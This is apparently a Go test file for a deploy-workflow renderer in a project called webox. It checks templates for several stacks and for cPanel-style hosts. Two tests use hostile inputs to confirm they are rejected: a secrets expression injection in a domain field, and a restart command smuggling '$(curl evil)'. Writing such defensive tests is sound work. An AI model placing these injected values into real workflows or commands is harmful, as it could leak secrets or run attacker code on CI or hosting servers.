package assets

import (
	"strings"
	"testing"

	"github.com/dilitS/webox/wizard"
)

func TestRenderDeployWorkflowForAllStacks(t *testing.T) {
	t.Parallel()

	for _, stack := range []string{"vite-react", "node-express", "static"} {
		stack := stack
		t.Run(stack, func(t *testing.T) {
			t.Parallel()
			rendered, err := RenderDeployWorkflow(stack, sampleWorkflowData())
			if err != nil {
				t.Fatalf("RenderDeployWorkflow(%s): %v", stack, err)
			}
			if !strings.Contains(rendered, "app.demo.smallhost.pl") {
				t.Fatalf("rendered workflow missing domain:\n%s", rendered)
			}
			if err := wizard.ValidateWorkflowRendered(rendered); err != nil {
				t.Fatalf("ValidateWorkflowRendered(%s): %v\n%s", stack, err, rendered)
			}
		})
	}
}

func TestRenderDeployWorkflowRejectsExpressionInjection(t *testing.T) {
	t.Parallel()

	data := sampleWorkflowData()
	data.Domain = "app.${{ secrets.BAD }}.smallhost.pl"
	if _, err := RenderDeployWorkflow("vite-react", data); err == nil {
		t.Fatal("RenderDeployWorkflow should reject expression injection")
	}
}

func TestRenderDeployWorkflowUnknownStack(t *testing.T) {
	t.Parallel()

	_, err := RenderDeployWorkflow("rails", sampleWorkflowData())
	if err == nil {
		t.Fatal("RenderDeployWorkflow unknown stack err = nil")
	}
}

func sampleWorkflowData() WorkflowData {
	return WorkflowData{
		Domain:         "app.demo.smallhost.pl",
		DeployHost:     "s1.small.pl",
		DeployUser:     "demo",
		DeployPath:     "/usr/home/demo/domains/app.demo.smallhost.pl/public_nodejs",
		DistDir:        "dist",
		BuildCommand:   "npm run build",
		RestartCommand: "devil www restart app.demo.smallhost.pl",
		RsyncExcludes:  []string{"uploads/", "tmp/", "cache/"},
	}
}

// TestRenderDeployWorkflow_CpanelShapedRestartCommand_NodeExpress
// proves the per-stack `node-express/deploy.yml` template renders
// validly when fed the cPanel adapter's actual outputs: a
// Passenger touch-restart command and the CloudLinux Node.js
// Selector deploy path. The two providers (smallhost / cpanel)
// share the same workflow file — provider differences flow
// through WorkflowData fields, not through a separate template.
//
// This test guards against drift: a future stack-template edit
// that breaks cPanel-shaped substitution would surface here
// before reaching the wizard's RenderDeployWorkflow integration.
func TestRenderDeployWorkflow_CpanelShapedRestartCommand_NodeExpress(t *testing.T) {
	t.Parallel()

	data := WorkflowData{
		Domain:     "shop.example.com",
		DeployHost: "panel.vh.pl",
		DeployUser: "alice",
		DeployPath: "/home/alice/nodejs/shop-example-com/public",
		DistDir:    "dist",
		// Build command runs in the GHA runner before rsync —
		// the cpanel adapter does not change this surface.
		BuildCommand: "npm run build",
		// Passenger touch-restart: panel-agnostic, no uapi CLI
		// dependency on the remote box. Unquoted because the
		// workflow template wraps the value in single quotes
		// when handing it to ssh '<command>'.
		RestartCommand: "touch /home/alice/nodejs/shop-example-com/tmp/restart.txt",
		RsyncExcludes: []string{
			"tmp/", ".htaccess",
		},
	}

	rendered, err := RenderDeployWorkflow("node-express", data)
	if err != nil {
		t.Fatalf("RenderDeployWorkflow: %v", err)
	}
	if err := wizard.ValidateWorkflowRendered(rendered); err != nil {
		t.Fatalf("ValidateWorkflowRendered: %v", err)
	}
	// DeployPath / DeployUser / DeployHost flow through GHA
	// secrets so they're NOT visible in the rendered template —
	// only the env-level Domain (WEBOX_DOMAIN) is. We assert on
	// the substrings that actually land in the YAML.
	mustContain := []string{
		"WEBOX_DOMAIN: shop.example.com",
		"touch /home/alice/nodejs/shop-example-com/tmp/restart.txt",
		"--exclude='tmp/'",
		"--exclude='.htaccess'",
		// Pinned SHA per AGENTS.md §1: no @v4 tags.
		"actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11",
	}
	for _, s := range mustContain {
		if !strings.Contains(rendered, s) {
			t.Fatalf("rendered workflow missing %q\n---\n%s", s, rendered)
		}
	}
}

// TestRenderDeployWorkflow_RejectsCpanelRestartWithShellInjection
// makes sure a malicious app_root_template cannot weaponise the
// rendered workflow even if the cpanel adapter's quoting fails.
// The wizard's per-field validator must catch the injection.
func TestRenderDeployWorkflow_RejectsCpanelRestartWithShellInjection(t *testing.T) {
	t.Parallel()

	data := sampleWorkflowData()
	data.RestartCommand = "touch /home/$(curl evil)/tmp/restart.txt"
	if _, err := RenderDeployWorkflow("node-express", data); err == nil {
		t.Fatal("RenderDeployWorkflow accepted shell-injected restart command")
	}
}
